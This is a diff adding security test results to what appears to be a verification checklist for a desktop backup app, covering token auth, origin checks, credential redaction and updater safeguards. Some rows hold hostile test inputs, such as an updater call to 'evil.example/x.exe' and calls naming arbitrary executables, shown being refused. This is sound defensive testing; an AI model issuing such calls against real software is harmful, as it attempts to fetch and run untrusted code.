@@ -56,6 +56,19 @@ Supplements the baseline after the Phase 3A balance/financial work (FIX_PLAN 3A-
 | PS-003 runtime scenarios | 📋 🪟 (a) staged restore with a corrupt/interrupted staged file → banner "FAILED — live database was not modified"; (b) successful restore → banner with pre-restore snapshot path; (c) kill the app mid-apply (simulated) → live DB still opens with original data |
 | PS-006 runtime scenarios | 📋 🪟 (a) foreign SQLite file → probe rejects with the exact reason, nothing staged; (b) backup with sibling media-<stamp> → confirm dialog names it, media mirrored with copied/skipped counts; (c) backup without media folder → dialog says only the DB will be restored |
 
+## 0e. Security & privacy 3B (executed 2026-10-11 — all green)
+
+| Check | Result |
+|---|---|
+| ESLint / tsc / vitest / parity | ✅ 0 errors · clean · 104/104 (87 prior + 17 new `tests/security.test.ts`) · 7 models ↔ 7 tables |
+| client-audit.mjs | ✅ PASS — +26 Phase-3B wiring checks (timing-safe compare, no `?token=` anywhere, Origin enforcement, cookie flow, loopback launcher, data-info redaction, fs scope narrowed, dialog perms removed, Rust picks + whitelist, CSP `script-src 'self'` no-ws, updater allowlist/digest/provenance/cleanup/length) |
+| next build | ✅ success |
+| Rust compile | 📋 review-only in sandbox (cargo unavailable) — tag CI compiles; `sha2 = 0.10` added (pure Rust) |
+| PS-012 evidence | ✅ automated: unauth `/api/backup` → 401 with token configured; `?token=` → 401; wrong/wrong-length token → 401; cross-origin POST → 403 (even with valid token); hostile Referer → 403; same-origin POST → 200; loopback cross-port → 200; no-Origin POST → 200; GET never origin-checked; page load sets HttpOnly SameSite=Strict cookie; cookie authenticates media GET. 📋 🪟 runtime: `npm start` binds 127.0.0.1 (log line); LAN `PSAMS_BIND=0.0.0.0` without token → refused with instructions; with token → client works via header+cookie |
+| PS-013 evidence | ✅ automated: `DATABASE_URL=libsql://user:sekret@host` → response contains neither `sekret` nor `libsql://`; `file:` URL still prints the local path |
+| PS-014 runtime scenarios | 📋 🪟 (a) restore flow: pick file (Rust dialog) → probe → confirm → restore applies; (b) `invoke("restore_backup", { source: "C:/Windows/notepad.exe" })` from devtools → refused (not a dialog pick); (c) backup-folder pick on USB → set, exit backup lands there; (d) export CSV/PDF/JSON via pick_save_path → writes to the picked file; (e) media upload/delete still work under appdata; (f) release build: inline scripts load (Tauri hash injection) — no blank window |
+| PS-015 runtime scenarios | 📋 🪟 (a) Check for updates → official asset lists; (b) download → sha256 verified, progress streams, installer saved; (c) truncated/corrupted download → error + partial file removed from Downloads; (d) install → launches; (e) `invoke("download_update", { url: "https://evil.example/x.exe", … })` → refused before any byte; (f) `invoke("install_update", { path: "<any other .exe>" })` → refused (not this session's verified download) |
+
 ## 1. Financial integrity (Phase 4)
 
 | ID | Case | Source finding | Status |
